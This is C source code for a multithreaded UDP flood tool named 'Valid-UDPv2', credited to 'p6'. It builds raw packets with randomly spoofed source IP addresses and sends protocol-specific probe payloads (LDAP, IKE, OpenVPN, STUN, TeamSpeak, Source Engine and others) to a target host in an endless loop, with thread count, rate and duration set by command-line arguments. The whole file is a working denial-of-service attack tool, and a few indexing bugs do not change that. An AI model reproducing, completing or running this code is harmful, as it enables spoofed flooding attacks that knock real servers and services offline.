#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 6144
#define PHI 0x9e3779b9
static unsigned long int Q[6144], c = 362436;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
        x++;
        c++;
        }
        return (Q[i] = r - x);
}
int randnum(int min_num, int max_num)
{
	int result = 0, low_num = 0, hi_num = 0;

	if (min_num < max_num)
	{
		low_num = min_num;
		hi_num = max_num + 1;
	}
	else
	{
		low_num = max_num + 1;
		hi_num = min_num;
	}

	result = (rand_cmwc() % (hi_num - low_num)) + low_num;
	return result;
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph) {
    struct udp_pseudo
    {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned char zero;
    unsigned char proto;
    unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_UDP;
    pseudohead.length=htons(sizeof(struct udphdr));
    int totaltudp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr);
    unsigned short *udp = malloc(totaltudp_len);
    memcpy((unsigned char *)udp,&pseudohead,sizeof(struct udp_pseudo));
    memcpy((unsigned char *)udp+sizeof(struct udp_pseudo),(unsigned char *)udph,sizeof(struct udphdr));
    unsigned short output = csum(udp,totaltudp_len);
    free(udp);
    return output;
}
void setup_ip_header(struct iphdr *iph)
{
        char ip[17];
        snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htonl(rand()%54321);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = inet_addr(ip);
}
void vulnMix(struct iphdr *iph, struct udphdr *udph)
{
        int protocol[] = {177, 389, 500, 1194, 1604, 2302, 3478, 8797, 9987, 20000, 27015, 27018, 30120, 33848 };
        char *hexa[] = {"\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff"};
        char *getPayload = hexa[rand()%253];
        switch(protocol[rand()%20]) {
            case 177  :
                memcpy((void *)udph + sizeof(struct udphdr), "\x00\x01\x00\x02\x00\x01\x00", 7);
                udph->len=htons(sizeof(struct udphdr) + 7);
                udph->dest = htons(177);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 7;
            break;
            case 389  :
                memcpy((void *)udph + sizeof(struct udphdr), "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00", 51);
                udph->len=htons(sizeof(struct udphdr) + 51);
                udph->dest = htons(389);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 51;
            break;
            case 500  :
                memcpy((void *)udph + sizeof(struct udphdr), "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01", 153);
                udph->len=htons(sizeof(struct udphdr) + 153);
                udph->dest = htons(500);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 153;
            break;
            case 1194  :
                memcpy((void *)udph + sizeof(struct udphdr), "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0", 12);
                udph->len=htons(sizeof(struct udphdr) + 12);
                udph->dest = htons(1194);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 12;
            break;
            case 1604  :
                memcpy((void *)udph + sizeof(struct udphdr), "\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 30);
                udph->len=htons(sizeof(struct udphdr) + 30);
                udph->dest = htons(1604);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 30;
            break;
	    case 2302  :
                memcpy((void *)udph + sizeof(struct udphdr), "x\x5c\x5c\x73\x74\x61\x74\x75\x73\x5c\x5c", 10);
                udph->len=htons(sizeof(struct udphdr) + 10);
                udph->dest = htons(2302);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 10;
            break;
	    case 3478  :
                memcpy((void *)udph + sizeof(struct udphdr), "\x00\x01\x00\x00\x21\x12\xa4\x42\x00\x00\x00\x00", 12);
                udph->len=htons(sizeof(struct udphdr) + 12);
                udph->dest = htons(3478);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 12;
            break;
            case 8767  :
                strcpy((void *)udph + sizeof(struct udphdr), "\xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
                udph->len=htons(sizeof(struct udphdr) + 148);
                udph->dest = htons(8767);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 148;
            break;
            case 9987  :
                memcpy((void *)udph + sizeof(struct udphdr), "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6", 162);
                udph->len=htons(sizeof(struct udphdr) + 162);
                udph->dest = htons(9987);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 162;
            break;
	    case 20000  :
                memcpy((void *)udph + sizeof(struct udphdr), "\x01", 1);
                udph->len=htons(sizeof(struct udphdr) + 1);
                udph->dest = htons(20000);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1;
            break;
            case 27015  :
                memcpy((void *)udph + sizeof(struct udphdr), "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65", 18);
                udph->len=htons(sizeof(struct udphdr) + 18);
                udph->dest = htons(27015);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 18;
            break;
	    case 27018  :
                memcpy((void *)udph + sizeof(struct udphdr), "\x20\x51\x75\x65\x72\x79\x00", 7);
                udph->len=htons(sizeof(struct udphdr) + 7);
                udph->dest = htons(27018);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 7;
            break;
	    case 30120  :
                memcpy((void *)udph + sizeof(struct udphdr), "\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73", 13);
                udph->len=htons(sizeof(struct udphdr) + 13);
                udph->dest = htons(30120);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 13;
            break;
	    case 33848  :
                memcpy((void *)udph + sizeof(struct udphdr), "\x00", 1);
                udph->len=htons(sizeof(struct udphdr) + 1);
                udph->dest = htons(33848);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1;
            break;
        }
}
void *flood(void *par1)
{
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = inet_addr(td);
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        udph->source = htons(rand() % 65535 - 1026);
        vulnMix(iph, udph);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
        }
        init_rand(time(NULL));
        register unsigned int i;
        i = 0;
        while(1){
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        udph->source = htons(16276);
        udph->check = 0;
        pps++;
        if(i >= limiter)
        {
        i = 0;
        usleep(sleeptime);
        }
        i++;
        }
}
int main(int argc, char *argv[ ])
{
        if(argc < 5){
        fprintf(stderr, "\e[38;5;18m[Valid-UDPv2] \e[38;5;239mMulti Protocol flood made by p6\n");
        fprintf(stdout, "\e[38;5;18m[Valid-UDPv2] \e[38;5;239m[Host] [Threads] [PPS] [Time]\n", argv[0]);
        exit(-1);
        }
        fprintf(stdout, "\e[38;5;18m[Valid-UDPv2] \e[38;5;239mCorrect agruments provided.\n");
	sleep(2);
        fprintf(stdout, "\e[38;5;18m[Valid-UDPv2] \e[38;5;239mFlood launched!\n");
        int num_threads = atoi(argv[2]);
        int maxpps = atoi(argv[3]);
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];
        int multiplier = 20;
        int i;
        for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        }
        for(i = 0;i<(atoi(argv[4])*multiplier);i++)
        {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
        if(1 > limiter)
        {
        sleeptime+=100;
        } else {
        limiter--;
        }
        } else {
        limiter++;
        if(sleeptime > 25)
        {
        sleeptime-=25;
        } else {
        sleeptime = 0;
        }
        }
        pps = 0;
        }
        return 0;
}